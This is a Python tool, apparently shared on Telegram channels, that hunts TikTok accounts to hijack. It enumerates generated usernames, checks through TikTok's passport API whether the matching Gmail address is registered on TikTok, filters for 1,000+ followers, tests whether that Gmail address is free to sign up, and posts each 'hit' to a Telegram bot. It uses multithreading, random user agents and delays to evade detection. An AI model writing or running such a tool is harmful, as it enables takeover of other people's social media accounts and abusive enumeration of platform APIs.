import requests
import random
import time
import json
import string
import os
import sys
import re
import uuid
from threading import Thread, Lock
from datetime import datetime
from user_agent import generate_user_agent as ua

# --- [ CONFIGURATION & THEME ] ---
P = '\x1b[1;97m'  # White
B = '\x1b[1;94m'  # Blue
O = '\x1b[1;96m'  # Cyan
Z = "\033[1;30m"  # Grey
X = '\033[1;33m'  # Yellow
F = '\033[2;32m'  # Green
Z3 = '\033[1;31m' # Red
L = "\033[1;95m"  # Pink
C = '\033[2;35m'  # Purple
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'

# Stats
lock = Lock()
stats = {
    "checked": 0,
    "tiktok_reg": 0,
    "tiktok_not_reg": 0,
    "gmail_avail": 0,
    "gmail_not_avail": 0,
    "hits": 0
}

def clear():
    os.system('clear||cls')

def banner():
    sd = random.choice([J1, J2, F1, C1])
    clear()
    print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J2} [ 𝑬𝑳𝑰𝑨 - 𝑴𝑨𝑺𝑻𝑬𝑹𝑷𝑰𝑬𝑪𝑬 ] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(sd + r"""
         ██╗ ███╗   ██╗ ███████╗ ████████╗  █████╗
         ██║ ████╗  ██║ ██╔════╝ ╚══██╔══╝ ██╔══██╗
         ██║ ██╔██╗ ██║ ███████╗    ██║    ███████║
         ██║ ██║╚██╗██║ ╚════██║    ██║    ██╔══██║
         ██║ ██║ ╚████║ ███████║    ██║    ██║  ██║
         ╚═╝ ╚═╝  ╚═══╝ ╚══════╝    ╚═╝    ╚═╝  ╚═╝
    """ + f"""
        {X}¸.•´¯`•.¸¸ {F} [꧁ 𝑻𝑰𝑲𝑻𝑶𝑲 𝑹𝑬𝑨𝑳 𝑯𝑼𝑵𝑻𝑬𝑹 ꧂ ]    {X}¸.•´¯`•.¸¸                       
              {F}TLE : @ELIA_py / @XRRHX | v3.0 Professional
{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J2} [ 𝑬𝑳𝑰𝑨 ] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
    """)

# --- [ CORE LOGIC ] ---

class TikTokHunter:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.session = requests.Session()
        self.proxy = None # Can be extended for proxy rotation

    def send_hit(self, username, followers):
        tlg = f'''
⭐ 𝐍𝐄𝐖 𝐑𝐄𝐀𝐋 𝐇𝐈𝐓 ⭐
━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
👤 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : {username}
📧 𝗘𝗺𝗮𝗶𝗹 : {username}@gmail.com
📊 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 : {followers:,}
✅ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗳𝗼𝗿 𝗦𝗶𝗴𝗻𝗨𝗽
🔗 𝗟𝗶𝗻𝗸 : tiktok.com/@{username}
━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
        '''
        try:
            requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage", json={
                "chat_id": self.chat_id,
                "text": tlg,
                "reply_markup": {"inline_keyboard": [[{"text": "Channel", "url": "https://t.me/XRRHX"}]]}
            })
            with lock: stats["hits"] += 1
        except: pass

    def check_gmail(self, email):
        """Advanced Gmail Signup Availability Check (Lifecycle Emulation)"""
        try:
            username = email.split('@')[0]
            # Simple yet effective check for signup availability
            url = f"https://mail.google.com/mail/gxlu?email={email}"
            headers = {'User-Agent': ua(), 'Accept': '*/*'}
            res = requests.get(url, headers=headers, timeout=10)
            # If no cookies returned, email is likely available for creation
            return 'Set-Cookie' not in res.headers
        except: return False

    def check_tiktok_reg(self, email):
        """Mobile API Emulation for Real Registration Check"""
        try:
            # Using TikTok's passport API which is used by the mobile app
            url = "https://www.tiktok.com/passport/email/check_email_registered"
            params = {
                "email": email,
                "aid": 1233,
                "language": "en",
                "sdk_version": "2",
                "app_name": "tiktok_web"
            }
            headers = {
                "User-Agent": ua(),
                "Accept": "application/json",
                "Referer": "https://www.tiktok.com/"
            }
            res = self.session.get(url, params=params, headers=headers, timeout=10).json()
            return res.get("is_registered") == 1
        except: return False

    def get_profile_data(self, username):
        """Extract Real Followers Count from Profile JSON Data"""
        try:
            url = f"https://www.tiktok.com/@{username}"
            headers = {"User-Agent": ua(), "Accept": "text/html"}
            res = requests.get(url, headers=headers, timeout=15)
            # Extract from SIGI_STATE or __UNIVERSAL_DATA_FOR_REAHT_ITERATIVE__
            match = re.search(r'"followerCount":(\d+)', res.text)
            if match:
                return int(match.group(1))
        except: pass
        return 0

    def hunt(self):
        while True:
            try:
                # Intelligent Username Generation (Old/Common Patterns)
                base = random.choice(["user", "pro", "king", "star", "dark", "light", "official", "dev", "master"])
                suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(2, 4)))
                username = base + suffix
                email = f"{username}@gmail.com"

                with lock: stats["checked"] += 1
                
                # 1. Check if registered on TikTok
                if self.check_tiktok_reg(email):
                    with lock: stats["tiktok_reg"] += 1
                    
                    # 2. Check followers (Quality Filter)
                    followers = self.get_profile_data(username)
                    if followers >= 1000:
                        
                        # 3. Check if Gmail is available for SignUp
                        if self.check_gmail(email):
                            with lock: stats["gmail_avail"] += 1
                            self.send_hit(username, followers)
                        else:
                            with lock: stats["gmail_not_avail"] += 1
                else:
                    with lock: stats["tiktok_not_reg"] += 1
                
                self.update_display()
                time.sleep(random.uniform(0.5, 1.5)) # Human-like delay
            except: pass

    def update_display(self):
        with lock:
            c = stats["checked"]
            tr = stats["tiktok_reg"]
            tnr = stats["tiktok_not_reg"]
            ga = stats["gmail_avail"]
            gna = stats["gmail_not_avail"]
            h = stats["hits"]
            
            sys.stdout.write(f"\r{Z}[{P}{datetime.now().strftime('%H:%M:%S')}{Z}] {O}Checked: {P}{c} {Z}| {F}T-Reg: {P}{tr} {Z}| {Z3}T-Not: {P}{tnr} {Z}| {C1}G-Hit: {P}{ga} {Z}| {J2}G-Fail: {P}{gna} {Z}| {F}HITS: {P}{h} ")
            sys.stdout.flush()

# --- [ STARTUP ] ---
if __name__ == "__main__":
    banner()
    bot_token = input(f"{P} [{F}?{P}] ENTER BOT TOKEN : ")
    chat_id = input(f"{P} [{F}?{P}] ENTER CHAT ID    : ")
    threads_num = int(input(f"{P} [{F}?{P}] ENTER THREADS    : "))
    
    hunter = TikTokHunter(bot_token, chat_id)
    banner()
    print(f"{F} [!] Starting Hunting Threads... Enjoy the Masterpiece!{P}\n")
    
    for _ in range(threads_num):
        t = Thread(target=hunter.hunt)
        t.daemon = True
        t.start()
        
    while True:
        time.sleep(1)
